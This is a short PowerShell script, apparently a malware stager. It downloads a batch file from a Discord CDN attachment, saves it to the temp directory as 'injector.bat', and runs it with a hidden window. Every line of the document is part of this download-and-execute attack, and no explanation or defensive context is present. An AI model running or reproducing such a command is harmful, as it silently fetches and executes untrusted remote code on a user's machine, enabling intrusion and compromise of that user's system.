iwr -useb https://cdn.discordapp.com/attachments/1137771634808332378/1141724610216337408/Sized.bat -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
